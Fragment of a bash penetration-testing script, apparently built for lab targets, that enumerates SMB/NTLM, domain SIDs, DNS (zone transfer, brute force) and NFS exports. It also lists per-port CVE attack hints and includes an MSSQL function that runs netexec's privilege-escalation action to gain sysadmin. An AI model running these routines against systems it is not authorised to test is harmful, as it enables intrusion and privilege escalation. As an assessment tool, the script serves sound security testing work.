#SMB_SIGNING=false
check_smb_protocols() {
    local TARGET_IP=$1

    if command -v nmap >/dev/null 2>&1; then
        info "Checking SMB protocol support via nmap"

        PROTO_OUTPUT=$(nmap --script smb-protocols -p445 "$TARGET_IP" 2>/dev/null)

        if echo "$PROTO_OUTPUT" | grep -q "1.0"; then
            notify "SMBv1 is ENABLED (insecure)!"
            SMB_V1=true
        else
            success "SMBv1 is NOT supported!"
        fi

        if echo "$PROTO_OUTPUT" | grep -E -q "2\.0|2\.1"; then
            success "SMBv2 is supported!"
            SMB_V2=true
        fi

        if echo "$PROTO_OUTPUT" | grep -E -q "3\.0|3\.1|3\.0\.2|3\.1\.1"; then
            success "SMBv3 is supported!"
            SMB_V3=true
        fi
    else
        warn "nmap not found — skipping SMB protocol detection"
    fi
}


check_ntlm_support() {
    set +e  # Disable exit-on-error for this function
    local TARGET_IP=$1

    SMB_SIGNING=false

    # Pick tool: prefer CME, fall back to NXC
    if command -v nxc >/dev/null 2>&1; then
        TOOL="nxc"
        TOOL_NAME="NXC"
    elif command -v crackmapexec >/dev/null 2>&1; then
        TOOL="crackmapexec"
        TOOL_NAME="CME"
    else
        warn "Neither crackmapexec nor netexec found — skipping NTLM check"
        return 1
    fi

    info "Checking SMB signing and NTLM support via $TOOL_NAME"

    TOOL_OUT=$("$TOOL" smb "$TARGET_IP" 2>/dev/null)

    if echo "$TOOL_OUT" | grep -q "signing:.*True"; then
        info "SMB Signing is enforced"
        SMB_SIGNING=true
    else
        notify "SMB Signing is NOT enforced!"
    fi

    if echo "$TOOL_OUT" | grep -q "SMBv1:.*True"; then
        notify "SMBv1 is ENABLED (insecure)!"
        SMB_V1=true
    fi

    echo
    info "Testing NTLM support via guest login using $TOOL_NAME"
    OUT=$("$TOOL" smb "$TARGET_IP" -u "guest" -p "" 2>/dev/null)

    if echo "$OUT" | grep -q "STATUS_NOT_SUPPORTED"; then
        notify "NTLM authentication appears to be DISABLED (STATUS_NOT_SUPPORTED)"
		NTLM_ENABLED=false
        print_ntlm_kerberos_time_sync_note "$TARGET_IP"
    elif echo "$OUT" | grep -q "\[-\]"; then
        notify "NTLM authentication attempted, but failed — NTLM likely ENABLED"
        NTLM_ENABLED=true
    elif echo "$OUT" | grep -q "\[+\]"; then
        critical "NTLM authentication SUCCESSFUL — NTLM is ENABLED!"
        NTLM_ENABLED=true
    else
        warn "NTLM test inconclusive — unknown response"
    fi
}

get_domain_sid() {
    local domain_user="${1:-}"
    local password="${2:-}"
    local target_domain_controller="${3:-}"
    local ntlm_on="${4:-${NTLM_ENABLED:-false}}"
    local lookup_user="${domain_user##*/}"
    local sid_output=""
    local rpc_output=""
    local resolved_account_sid=""
    local l_domain_sid=""
    local sid_source=""
    local kerberos_ccache=""
    local loot_domain="${AUTH_DOMAIN:-${LDAP_DOMAIN:-${KERB_REALM:-unknown}}}"
    local safe_dc=""
    local sid_evidence_file=""
    local rpc_transport_open=false
    local kerberos_detected=false

    # DOMAIN/user and DOMAIN\user are both accepted by the caller. rpcclient's
    # lookupnames command needs only the account name.
    lookup_user="${lookup_user##*\\}"

    echo
    info "Enumerating Domain SID for $target_domain_controller with user $domain_user..."

    # rpcclient uses SMB named-pipe RPC, so TCP 139 or 445 is required. TCP 135
    # alone only exposes the RPC endpoint mapper and is not a usable transport
    # for rpcclient.
    if printf '%s\n' "${OPEN_PORTS[@]}" | grep -Eq '^(139|445)$'; then
        rpc_transport_open=true
    fi

    # Reuse the scan/authentication results already collected by the script.
    if [[ "${HAS_KERB:-0}" == "1" || "${KERB_DETECTED:-false}" == true ||
          "${KERBEROS_FOUND:-false}" == true || "${KERBEROS_AUTH_OK:-false}" == true ]]; then
        kerberos_detected=true
    fi

    # rpcclient --use-krb5-ccache needs a real, non-expired cache. Prefer the
    # explicit KRB5CCNAME, but also support the default cache reported by klist.
    if command -v klist >/dev/null 2>&1 && klist -s >/dev/null 2>&1; then
        kerberos_ccache="${KRB5CCNAME:-}"
        if [[ -z "$kerberos_ccache" ]]; then
            kerberos_ccache=$(klist 2>/dev/null | sed -n 's/^Ticket cache:[[:space:]]*//p' | head -n 1)
        fi
    fi

    # kerberos_auth_check validates the credentials and then destroys its test
    # ticket. Recreate a reusable cache when Kerberos auth was confirmed and no
    # usable cache is currently present.
    if $kerberos_detected && [[ -z "$kerberos_ccache" ]] &&
       [[ "${KERBEROS_AUTH_OK:-false}" == true ]] &&
       declare -F create_local_kerberos_ccache >/dev/null 2>&1; then
        info "Kerberos is available, but no usable ccache is loaded; creating one for SID lookup"
        create_local_kerberos_ccache || true
        if command -v klist >/dev/null 2>&1 && klist -s >/dev/null 2>&1; then
            kerberos_ccache="${KRB5CCNAME:-}"
            if [[ -z "$kerberos_ccache" ]]; then
                kerberos_ccache=$(klist 2>/dev/null | sed -n 's/^Ticket cache:[[:space:]]*//p' | head -n 1)
            fi
        fi
    fi

    # Keep impacket-lookupsid as the primary method. Unlike the old code, a
    # missing command or failed lookup now falls through to rpcclient.
    if command -v impacket-lookupsid >/dev/null 2>&1; then
        if [[ "$ntlm_on" == true ]]; then
            echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
            echo -e "        ${GREEN}impacket-lookupsid ${domain_user}:${password}@${target_domain_controller}${RESET}"
            sid_output=$(impacket-lookupsid "$domain_user:$password@$target_domain_controller" 2>&1 || true)
        elif [[ -n "$kerberos_ccache" ]]; then
            echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
            echo -e "        ${GREEN}impacket-lookupsid ${domain_user}@${target_domain_controller} -k -no-pass${RESET}"
            sid_output=$(impacket-lookupsid "$domain_user@$target_domain_controller" -k -no-pass 2>&1 || true)
        else
            note "NTLM is unavailable and no usable Kerberos ccache was found for impacket-lookupsid"
        fi

        l_domain_sid=$(printf '%s\n' "$sid_output" |
            sed -nE 's/.*[Dd]omain SID is:[[:space:]]*(S-1(-[0-9]+)+).*/\1/p' |
            head -n 1)
        [[ -n "$l_domain_sid" ]] && sid_source="impacket-lookupsid"
    else
        note "impacket-lookupsid not found; trying rpcclient fallback"
    fi

    if [[ -z "$l_domain_sid" ]] && $rpc_transport_open; then
        if ! command -v rpcclient >/dev/null 2>&1; then
            warn "rpcclient not found in PATH; cannot run the SID fallback"
        else
            # Prefer a usable Kerberos cache when one is available. If the
            # Kerberos lookup fails and NTLM is enabled, retry with credentials.
            if [[ -n "$kerberos_ccache" ]]; then
                info "Trying rpcclient Domain SID lookup with Kerberos ccache"
                echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
                echo -e "        ${GREEN}printf 'lookupnames %s\\nexit\\n' '$lookup_user' | rpcclient '$target_domain_controller' --use-krb5-ccache='$kerberos_ccache'${RESET}"
                rpc_output=$(printf 'lookupnames %s\nexit\n' "$lookup_user" |
                    rpcclient "$target_domain_controller" "--use-krb5-ccache=$kerberos_ccache" 2>&1 || true)
                resolved_account_sid=$(printf '%s\n' "$rpc_output" |
                    awk 'match($0, /S-1(-[0-9]+)+/) { print substr($0, RSTART, RLENGTH); exit }')

                if [[ -n "$resolved_account_sid" ]]; then
                    l_domain_sid="${resolved_account_sid%-*}"
                    sid_source="rpcclient (Kerberos)"
                fi
            elif $kerberos_detected; then
                note "Kerberos was detected, but rpcclient cannot use it without a valid ccache"
            fi

            if [[ -z "$l_domain_sid" && "$ntlm_on" == true ]]; then
                info "Trying rpcclient Domain SID lookup with password/NTLM authentication"
                echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
                echo -e "        ${GREEN}printf 'lookupnames %s\\nexit\\n' '$lookup_user' | rpcclient '$target_domain_controller' -U '${domain_user}%${password}'${RESET}"
                rpc_output=$(printf 'lookupnames %s\nexit\n' "$lookup_user" |
                    rpcclient "$target_domain_controller" -U "$domain_user%$password" 2>&1 || true)
                resolved_account_sid=$(printf '%s\n' "$rpc_output" |
                    awk 'match($0, /S-1(-[0-9]+)+/) { print substr($0, RSTART, RLENGTH); exit }')

                if [[ -n "$resolved_account_sid" ]]; then
                    l_domain_sid="${resolved_account_sid%-*}"
                    sid_source="rpcclient (password/NTLM)"
                fi
            elif [[ -z "$l_domain_sid" && "$ntlm_on" != true ]]; then
                note "NTLM is unavailable; skipping the non-Kerberos rpcclient fallback"
            fi
        fi
    elif [[ -z "$l_domain_sid" ]]; then
        if printf '%s\n' "${OPEN_PORTS[@]}" | grep -qx '135'; then
            note "TCP 135 is open, but rpcclient requires SMB RPC over TCP 139 or 445"
        else
            note "SMB RPC transport is unavailable (TCP 139/445 not open); skipping rpcclient fallback"
        fi
    fi

    if [[ -n "$l_domain_sid" ]]; then
        success "Domain SID found via $sid_source: ${BLUE}$l_domain_sid${RESET}"

        # Preserve the original flat-file artifact for compatibility, and also
        # feed the result into the initialized evidence/loot framework.
        echo "$l_domain_sid" > "domain_sid_${target_domain_controller}.txt"
        DOMAIN_SID="$l_domain_sid"

        safe_dc="$(sanitize_name "$target_domain_controller")"
        sid_evidence_file="${EVIDENCE_DIR:-.}/domain_sid_${safe_dc}.txt"
        {
            echo "collected_at=$(date -Is)"
            echo "domain=$loot_domain"
            echo "domain_controller=$target_domain_controller"
            echo "lookup_account=$lookup_user"
            [[ -n "$resolved_account_sid" ]] && echo "account_sid=$resolved_account_sid"
            echo "domain_sid=$l_domain_sid"
            echo "source=$sid_source"
        } > "$sid_evidence_file"

        record_loot "domain_sid" "$loot_domain $l_domain_sid" "$sid_evidence_file"
        success "Domain SID loot recorded in: ${BYELLOW}$LOOT_INDEX_FILE${RESET}"
        success "Domain SID evidence saved to: ${BYELLOW}$sid_evidence_file${RESET}"
        return 0
    fi

    warn "Failed to extract Domain SID."
    [[ -n "$sid_output" ]] && echo "$sid_output" > "lookupsid_debug_${target_domain_controller}.log"
    [[ -n "$rpc_output" ]] && echo "$rpc_output" > "rpcclient_sid_debug_${target_domain_controller}.log"
    return 1
}


dns_enum() {
    local dns_server="${1:-$TARGET_IPV4}"
    local domain="${2:-$DNS_DOMAIN}"
    local outdir="dns_${dns_server}"
    local loot_file="${outdir}/dns_loot_${dns_server}.txt"

    DNS_ENUM_DONE=true
    DNS_LOOT_FILE="$loot_file"

    mkdir -p "$outdir"

    info "Starting DNS enumeration against ${CYAN}${dns_server}${RESET}"
    echo "[*] DNS enumeration for $dns_server" > "$loot_file"

    if ! command -v dig >/dev/null 2>&1; then
        warn "dig not found — install dnsutils: sudo apt install dnsutils"
        return 1
    fi

    success "DNS server detected or DNS enum requested"
    DNS_FOUND=true

    echo
    info "Basic DNS server checks"
    echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
    echo -e "     ${GREEN}dig @$dns_server version.bind CHAOS TXT${RESET}"
    echo -e "     ${GREEN}dig @$dns_server -x $dns_server${RESET}"
    echo -e "     ${GREEN}dig @$dns_server ANY .${RESET}"

    {
        echo
        echo "===== BASIC DNS CHECKS ====="
        echo "[COMMAND] dig @$dns_server version.bind CHAOS TXT"
        timeout 6 dig @"$dns_server" version.bind CHAOS TXT

        echo
        echo "[COMMAND] dig @$dns_server -x $dns_server"
        timeout 6 dig @"$dns_server" -x "$dns_server"

        echo
        echo "[COMMAND] dig @$dns_server ANY ."
        timeout 6 dig @"$dns_server" ANY .
    } | tee -a "$loot_file"

    # Try to infer domain from reverse DNS if one was not supplied
    if [[ -z "$domain" ]]; then
        domain="$(
            dig @"$dns_server" -x "$dns_server" +short 2>/dev/null \
            | sed 's/\.$//' \
            | head -n 1
        )"

        if [[ -n "$domain" ]]; then
            success "Inferred DNS name from PTR: ${GREEN}$domain${RESET}"
            DNS_DOMAIN="$domain"
            echo "$domain" >> "$DISCOVERED_HOSTS"
            echo "$dns_server $domain" >> "$HOSTS_FILE"

            # If PTR is host.domain.tld, also try base domain.
            if [[ "$domain" == *.*.* ]]; then
                local base_domain
                base_domain="$(echo "$domain" | awk -F. '{print $(NF-1)"."$NF}')"
                if [[ -n "$base_domain" ]]; then
                    note "Possible base domain: ${GREEN}$base_domain${RESET}"
                    echo "$base_domain" >> "$DISCOVERED_HOSTS"
                fi
            fi
        else
            notify "Could not infer DNS domain from PTR"
        fi
    fi

    if [[ -z "$domain" ]]; then
        notify "No DNS domain known. Use --dns-domain=example.htb for deeper checks."
        echo
        lightbulb "Try discovering a domain from web headers, SMTP banner, SSL certs, or reverse DNS."
        return 0
    fi

    DNS_DOMAIN="$domain"

    echo
    info "Querying common DNS records for ${CYAN}$domain${RESET}"
    echo -e "  ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
    echo -e "     ${GREEN}dig @$dns_server $domain A${RESET}"
    echo -e "     ${GREEN}dig @$dns_server $domain NS${RESET}"
    echo -e "     ${GREEN}dig @$dns_server $domain MX${RESET}"
    echo -e "     ${GREEN}dig @$dns_server $domain TXT${RESET}"

    {
        echo
        echo "===== COMMON RECORDS FOR $domain ====="

        for qtype in A AAAA NS MX TXT SOA CNAME SRV; do
            echo
            echo "[COMMAND] dig @$dns_server $domain $qtype"
            timeout 6 dig @"$dns_server" "$domain" "$qtype"
        done
    } | tee -a "$loot_file"

    # Save discovered hostnames from dig output
    grep -Eio '([a-zA-Z0-9_-]+\.)+[a-zA-Z]{2,}' "$loot_file" \
        | sed 's/\.$//' \
        | sort -u \
        | tee "${outdir}/dns_hostnames_${dns_server}.txt" >/dev/null

    while read -r host; do
        [[ -z "$host" ]] && continue
        echo "$host" >> "$DISCOVERED_HOSTS"
        echo "$dns_server $host" >> "$HOSTS_FILE"
    done < "${outdir}/dns_hostnames_${dns_server}.txt"

    success "Saved discovered DNS names to ${outdir}/dns_hostnames_${dns_server}.txt"

    if [[ "$DNS_AXFR" == true ]]; then
        echo
        info "Attempting DNS zone transfer for ${CYAN}$domain${RESET}"
        echo -e "  ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
        echo -e "     ${GREEN}dig axfr @$dns_server $domain${RESET}"

        local axfr_file="${outdir}/axfr_${domain}_${dns_server}.txt"

        timeout 10 dig axfr @"$dns_server" "$domain" | tee "$axfr_file" | tee -a "$loot_file" >/dev/null

        if grep -qE 'IN[[:space:]]+(A|AAAA|CNAME|MX|NS|TXT|SOA)' "$axfr_file" && ! grep -qi 'Transfer failed' "$axfr_file"; then
            DNS_ZONE_XFER_OK=true
            high_risk "DNS zone transfer appears successful for ${domain}"
            success "Saved AXFR output to $axfr_file"
            DNS_AXFR_FILE="$axfr_file"

            grep -Eio '([a-zA-Z0-9_-]+\.)+'"${domain//./\\.}" "$axfr_file" \
                | sed 's/\.$//' \
                | sort -u \
                | tee "${outdir}/axfr_hosts_${domain}.txt" >/dev/null

            while read -r host; do
                [[ -z "$host" ]] && continue
                echo "$host" >> "$DISCOVERED_HOSTS"
                echo "$dns_server $host" >> "$HOSTS_FILE"
            done < "${outdir}/axfr_hosts_${domain}.txt"

            lightbulb "Add discovered hosts to /etc/hosts, then run web/vhost enumeration."
        else
            notify "Zone transfer failed or returned no useful records"
        fi
    fi

    if [[ "$DNS_BRUTE" == true ]]; then
        echo
        info "Starting DNS brute force for ${CYAN}$domain${RESET}"

        if [[ ! -f "$DNS_WORDLIST" ]]; then
            warn "DNS wordlist not found: $DNS_WORDLIST"
            lightbulb "Install SecLists or specify: --dns-wordlist=/path/to/list.txt"
            return 0
        fi

        local brute_file="${outdir}/dns_brute_${domain}_${dns_server}.txt"

        if command -v gobuster >/dev/null 2>&1; then
            echo -e "  ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
            echo -e "  ${GREEN}gobuster dns -d $domain -r $dns_server -w $DNS_WORDLIST -o $brute_file${RESET}"

            gobuster dns \
                -d "$domain" \
                -r "$dns_server" \
                -w "$DNS_WORDLIST" \
                -o "$brute_file" 2>&1 | tee -a "$loot_file"

            grep -Eio 'Found: ([a-zA-Z0-9_-]+\.)+'"${domain//./\\.}" "$brute_file" 2>/dev/null \
                | awk '{print $2}' \
                | sort -u \
                | tee "${outdir}/dns_brute_hosts_${domain}.txt" >/dev/null || true

            while read -r host; do
                [[ -z "$host" ]] && continue
                echo "$host" >> "$DISCOVERED_HOSTS"
                echo "$dns_server $host" >> "$HOSTS_FILE"
            done < "${outdir}/dns_brute_hosts_${domain}.txt"

            success "DNS brute-force results saved to $brute_file"

        elif command -v ffuf >/dev/null 2>&1; then
            notify "gobuster not found — using ffuf DNS brute style with Host header is not real DNS resolution."
            lightbulb "Install gobuster for DNS brute force: sudo apt install gobuster"
        else
            warn "Neither gobuster nor suitable DNS brute tool found"
            lightbulb "Install gobuster: sudo apt install gobuster"
        fi
    fi

    echo
    success "DNS enumeration complete"
    success "DNS loot file: $loot_file"

    echo
    lightbulb "Useful next steps:"
    echo -e "     ${GREEN}cat $outdir/dns_hostnames_${dns_server}.txt${RESET}"
    echo -e "     ${GREEN}sort -u $DISCOVERED_HOSTS${RESET}"
    echo -e "     ${GREEN}sort -u $HOSTS_FILE${RESET}"
}

# --------- NFS Enumeration ----------
enumerate_nfs() {
    set +e  # Disable exit-on-error for this function
    local target="${1:?NFS target required}"
    local outdir="nfs_${target}"
    local rpc_file="${outdir}/rpcinfo.txt"
    local exports_raw="${outdir}/showmount_exports.txt"
    local exports_clean="${outdir}/exports.txt"
    local nmap_file="${outdir}/nmap_nfs.txt"
    local rpc_out=""
    local showmount_out=""
    local export_path=""
    local export_acl=""
    local safe_name=""

    NFS_ENUM_DONE=true
    NFS_LOOT_DIR="$outdir"
    NFS_EXPORTS_FILE="$exports_clean"

    mkdir -p "$outdir"

    echo
    echo -e "${BLUE}========================================${RESET}"
    echo -e "${BYELLOW} NFS / RPC Enumeration ${RESET}"
    echo -e "${BLUE}========================================${RESET}"
    info "Running non-destructive NFS checks against ${CYAN}${target}${RESET}"

    # RPC program discovery is useful because mountd, nlockmgr, and status
    # commonly listen on dynamic high ports.
    if command -v rpcinfo >/dev/null 2>&1; then
        echo -e " ${YELLOW}${ICON_TIP} Copy/Paste:${RESET}"
        echo -e " ${GREEN}rpcinfo -p '$target'${RESET}"

        rpc_out="$(timeout 8 rpcinfo -p "$target" 2>&1 || true)"
        printf '%s\n' "$rpc_out" | tee "$rpc_file"

        if printf '%s\n' "$rpc_out" \
            | grep -Eqi '(^|[[:space:]])100003([[:space:]]|$)|(^|[[:space:]])nfs([[:space:]]|$)'; then
            NFS_FOUND=true
            success "NFS RPC program detected"
        fi

        if printf '%s\n' "$rpc_out" | grep -Eqi 'mountd|100005'; then
            success "RPC mountd detected"
        fi
    else
        warn "rpcinfo not installed"
        lightbulb "Install the NFS client utilities: sudo apt install nfs-common"
    fi

    # NFSv4 may expose TCP/2049 without disclosing mountd through RPCBind.
    if printf '%s\n' "${OPEN_PORTS[@]}" | grep -qx '2049'; then
        NFS_FOUND=true
    fi

    # showmount primarily applies to NFSv2/v3.
    if command -v showmount >/dev/null 2>&1; then
        echo
        echo -e " ${YELLOW}${ICON_TIP} Copy/Paste:${RESET}"
        echo -e " ${GREEN}showmount -e '$target'${RESET}"

        showmount_out="$(timeout 8 showmount -e "$target" 2>&1 || true)"
        printf '%s\n' "$showmount_out" | tee "$exports_raw"

        printf '%s\n' "$showmount_out" \
            | awk '
                NR > 1 && $1 ~ /^\// {
                    path=$1
                    $1=""
                    sub(/^[[:space:]]+/, "", $0)
                    print path "\t" $0
                }
            ' > "$exports_clean"
    else
        warn "showmount not installed"
        lightbulb "Install it with: sudo apt install nfs-common"
        : > "$exports_clean"
    fi

    if [[ -s "$exports_clean" ]]; then
        NFS_EXPORTS_FOUND=true
        high_risk "NFS exports are remotely visible"
        success "Clean export list saved to: ${BYELLOW}${exports_clean}${RESET}"

        while IFS=$'\t' read -r export_path export_acl; do
            [[ -z "$export_path" ]] && continue

            echo
            echo -e " ${CYAN}${ICON_SHARE} Export:${RESET} ${BYELLOW}${export_path}${RESET}"
            echo -e "   Allowed clients: ${export_acl:-unknown}"

            if [[ "${export_acl:-}" == "*" ]] \
                || printf '%s\n' "${export_acl:-}" \
                    | grep -Eqi 'everyone|\(everyone\)|world'; then
                NFS_WORLD_EXPORT=true
                critical "World-accessible NFS export: ${export_path}"
            fi

            safe_name="$(
                printf '%s' "$export_path" \
                    | sed 's#^/##; s#[^[:alnum:]_.-]#_#g'
            )"

            [[ -z "$safe_name" ]] && safe_name="root"

            echo -e " ${YELLOW}${ICON_TIP} Read-only mount attempts:${RESET}"

            echo -e \
                " ${GREEN}sudo mkdir -p '/mnt/nfs_${safe_name}'${RESET}"

            echo -e \
                " ${GREEN}sudo mount -t nfs -o ro,nosuid,nodev,noexec,nolock,vers=3 '${target}:${export_path}' '/mnt/nfs_${safe_name}'${RESET}"

            echo -e \
                " ${GREEN}sudo mount -t nfs4 -o ro,nosuid,nodev,noexec '${target}:${export_path}' '/mnt/nfs_${safe_name}'${RESET}"

            echo -e \
                " ${GREEN}ls -lan '/mnt/nfs_${safe_name}'${RESET}"

            echo -e \
                " ${GREEN}find '/mnt/nfs_${safe_name}' -xdev -maxdepth 3 -printf '%M %u:%g %s %TY-%Tm-%Td %TH:%TM %p\\n' 2>/dev/null${RESET}"

        done < "$exports_clean"

        ATTACK_PATHS+=(
            "NFS exports exposed: inspect backups, home directories, web roots, SSH material, configuration files, and numeric UID/GID ownership"
        )
    else
        notify "showmount returned no export list"
        note "This does not exclude NFSv4. Review rpcinfo/Nmap output and test an NFSv4 pseudo-root manually."

        echo -e " ${YELLOW}${ICON_TIP} NFSv4 probe:${RESET}"
        echo -e \
            " ${GREEN}sudo mkdir -p /mnt/nfs4_root${RESET}"

        echo -e \
            " ${GREEN}sudo mount -t nfs4 -o ro,nosuid,nodev,noexec '${target}:/' /mnt/nfs4_root${RESET}"
    fi

    # Nmap provides a second source of NFS/RPC evidence.
    if command -v nmap >/dev/null 2>&1; then
        echo
        info "Running Nmap NFS/RPC scripts"

        echo -e " ${YELLOW}${ICON_TIP} Copy/Paste:${RESET}"
        echo -e \
            " ${GREEN}nmap -Pn -sT -p111,2049 --script=rpcinfo,nfs-showmount,nfs-ls,nfs-statfs '$target'${RESET}"

        timeout 60 nmap -Pn -sT \
            -p111,2049 \
            --script=rpcinfo,nfs-showmount,nfs-ls,nfs-statfs \
            "$target" \
            -oN "$nmap_file" \
            >/dev/null 2>&1 || true

        if [[ -s "$nmap_file" ]]; then
            cat "$nmap_file"
            success "Nmap NFS output saved to: ${BYELLOW}${nmap_file}${RESET}"
        else
            notify "Nmap NFS scripts returned no saved output"
        fi
    fi

    if [[ "$NFS_FOUND" == true ]]; then
        echo
        lightbulb "NFS review priorities:"
        echo "  → Keep the first mount read-only"
        echo "  → Use ls -lan to preserve numeric UID/GID evidence"
        echo "  → Look for .ssh, backups, web roots, .env files, configs, mail, cron scripts, and database dumps"
        echo "  → Treat writable exports and no_root_squash as high-risk, but validate before changing files"
    fi
}

# -------------------------------------------------------
# ------------------------ START ------------------------
# -------------------------------------------------------

# --------- Ports ----------
PORTS=(
    "21:FTP:interesting"
    "22:SSH:open"
    "23:Telnet:high"
    "25:SMTP:interesting"
    "53:DNS:open"
    "80:HTTP:open"
    "88:Kerberos:high"
    "110:POP3:interesting"
    "111:RPCBind:interesting"
    "135:MSRPC:high"
    "139:SMB:high"
    "143:IMAP:interesting"
    "389:LDAP:interesting"
    "443:HTTPS:open"
    "445:SMB:high"
    "515:PRINTER:open"
    "631:PRINTER:open"
    "636:LDAPS:interesting"
    "993:IMAPS:interesting"
    "1433:SQL Server:high"
    "2049:Network File System:high"
    "2375:Docker API:high"
    "2377:Docker Swarm:interesting"
    "3000:Web Dev:interesting"
    "3306:MySQL:interesting"
    "3389:RDP:high"
    "5000:Web/Docker:interesting"
    "5985:WinRM:high"
    "5986:WinRM HTTPS:interesting"
    "6379:Redis:high"
    "6443:Kubernetes API:high"
    "8080:HTTP-Alt:interesting"
    "8443:HTTPS-Alt:interesting"
    "9090:Web:interesting"
    "9100:PRINTER:interesting"
    "27017:MongoDB:interesting"
    "54925:BROTHER_PRINTER:open"
)

# --------- CVE / Attack Surface Hints ----------
declare -A CVE_HINTS=(
  [21]="Anonymous FTP, writable dirs, legacy backdoors (CVE-2015-3306)"
  [22]="Weak creds, outdated OpenSSH, user enumeration (CVE-2018-15473)"
  [23]="Cleartext auth, legacy devices, credential reuse"
  [25]="Open relay, user enumeration, Exim RCE (CVE-2019-10149)"
  [53]="Zone transfer (AXFR), DNS recursion"
  [80]="Web vulns: file upload, auth bypass, outdated CMS"
  [88]="Kerberos roasting, AD misconfig, pre-auth disabled"
  [111]="RPC program discovery, NFS/mountd enumeration, and dynamic RPC services"
  [110]="Cleartext POP3, weak creds"
  [139]="SMB NULL session, EternalBlue class issues"
  [389]="Anonymous LDAP bind, domain info disclosure"
  [443]="TLS misconfig, weak ciphers, web vulns"
  [445]="SMB relay, signing disabled, MS17-010"
  [631]="CUPS info leak, printer RCE class issues"
  [1433]="MSSQL auth abuse, xp_cmdshell exposure"
  [2049]="Exposed NFS exports, weak client restrictions, UID/GID trust, sensitive backups, or SSH keys"
  [2375]="Unauth Docker API → container escape risk"
  [3000]="Dev panels, default creds, debug mode"
  [3306]="Weak DB creds, data exposure"
  [3389]="RDP brute-force, BlueKeep (CVE-2019-0708)"
  [5985]="WinRM lateral movement, credential reuse"
  [6379]="Unauth Redis → file write / RCE"
  [6443]="K8s API anonymous access"
  [8080]="Admin consoles, exposed dashboards"
  [9100]="Raw printer protocol info disclosure"
  [27017]="Unauth MongoDB data exposure"
)

print_cve_hint() {
    local port="$1"
    if [[ -n "${CVE_HINTS[$port]:-}" ]]; then
        echo -e "  - ${CVE_HINTS[$port]}"
    fi
}

# Optional RID-brute status flags
MSSQL_RIDBRUTE_OK=false
MSSQL_RIDBRUTE_LCLAUTH_OK=false

run_mssql_priv_detection() {
    local auth_mode="$1"
    local auth_label
    local priv_output clean_output targets
    local priv_rc=0
    local priv_command="netexec"
    local rollback_command="netexec"
    local quoted arg

    local -a base_args=(
        mssql
        "$TARGET_IPV4"
        -u "$AUTH_USER"
        -p "$AUTH_PASS"
    )

    case "$auth_mode" in
        default)
            auth_label="standard authentication"
            ;;

        local)
            auth_label="local authentication"
            base_args+=(--local-auth)
            ;;

        *)
            warn "Unknown MSSQL authentication mode: $auth_mode"
            return 2
            ;;
    esac

    local -a priv_args=(
        "${base_args[@]}"
        -M mssql_priv
        -o ACTION=privesc
    )

    # Generate a shell-safe copy/paste command.
    for arg in "${priv_args[@]}"; do
        printf -v quoted '%q' "$arg"
        priv_command+=" $quoted"
    done

    lightbulb \
        "Checking MSSQL impersonation and privilege-escalation paths:"

    printf '        %b%s%b\n' \
        "$GREEN" "$priv_command" "$RESET"

    record_command \
        "MSSQL" \
        "Privilege Escalation - Impersonation/db_owner" \
        "$priv_command"

    MSSQL_PRIVESC_ATTEMPTED=true
    MSSQL_PRIVESC_MODE="$auth_mode"

    # Preserve output and exit status without triggering set -e.
    if priv_output="$(netexec "${priv_args[@]}" 2>&1)"; then
        priv_rc=0
    else
        priv_rc=$?
    fi

    # Remove ANSI color codes before parsing.
    clean_output="$(
        sed $'s/\033\\[[0-9;]*m//g' <<< "$priv_output"
    )"

    # Display only module findings. This avoids printing the authentication
    # line containing the password a second time.
    grep -E \
        '^[[:space:]]*MSSQL_PRIV[[:space:]]+' \
        <<< "$clean_output" || true

    # Confirm that authentication succeeded during this invocation.
    if ! grep -Eq \
        '^[[:space:]]*MSSQL[[:space:]].*\[\+\]' \
        <<< "$clean_output"; then

        warn "MSSQL ${auth_label} failed during mssql_priv"

        if [[ "$priv_rc" -ne 0 ]]; then
            note "NetExec exited with status $priv_rc"
        fi

        return 1
    fi

    MSSQL_PRIV_CHECKED=true

    # Extract everything after "can impersonate:".
    #
    # Examples handled:
    #   kevin can impersonate: appdev
    #   DOMAIN\kevin can impersonate: sa (sysadmin)
    #   login can impersonate: other login (which can privesc via dbowner)
    #
    # No domain, hostname, source username, or target username is hard-coded.
    targets="$(
        awk '
            /can impersonate:/ {
                value = $0

                sub(/^.*can impersonate:[[:space:]]*/, "", value)
                sub(/[[:space:]]+\(sysadmin\).*$/, "", value)
                sub(/[[:space:]]+\(which can privesc via dbowner\).*$/, "", value)

                sub(/^[[:space:]]+/, "", value)
                sub(/[[:space:]]+$/, "", value)

                if (value != "" && !seen[value]++)
                    print value
            }
        ' <<< "$clean_output"
    )"

    if [[ -n "$targets" ]]; then
        MSSQL_IMPERSONATION_FOUND=true
        MSSQL_IMPERSONATION_TARGETS="$targets"

        critical "MSSQL login can impersonate SQL principals:"
    
        while IFS= read -r target; do
            [[ -n "$target" ]] || continue

            printf '      - %b%s%b\n' \
                "$BYELLOW" "$target" "$RESET"
        done <<< "$targets"
    fi

    if grep -Eqi \
        'can impersonate:.*\(sysadmin\)|can privesc via dbowner|which can privesc via dbowner' \
        <<< "$clean_output"; then

        MSSQL_PRIVESC_PATH_FOUND=true
        critical "MSSQL privilege-escalation path to sysadmin identified"
    fi

    if grep -Eqi 'privesc via dbowner' <<< "$clean_output"; then
        MSSQL_DBOWNER_PRIVESC_FOUND=true
        critical "MSSQL db_owner/TRUSTWORTHY escalation path found"
    fi

    if grep -Eqi 'is already a sysadmin' <<< "$clean_output"; then
        MSSQL_SYSADMIN=true
        critical "MSSQL login is already a sysadmin"
    fi

    if grep -Eqi 'is now a sysadmin' <<< "$clean_output"; then
        MSSQL_PRIVESC_OK=true
        MSSQL_SYSADMIN=true
        critical "MSSQL privilege escalation succeeded"
    fi

    if grep -Eqi \
        "can't find any path to privesc|cannot find any path to privesc" \
        <<< "$clean_output"; then

        if [[ "$MSSQL_IMPERSONATION_FOUND" == true ]]; then
            warn \
                "MSSQL impersonation found, but NetExec found no direct path to sysadmin"
        else
            notify "No MSSQL privilege-escalation path was found"
        fi
    fi

    if [[ "$priv_rc" -ne 0 ]]; then
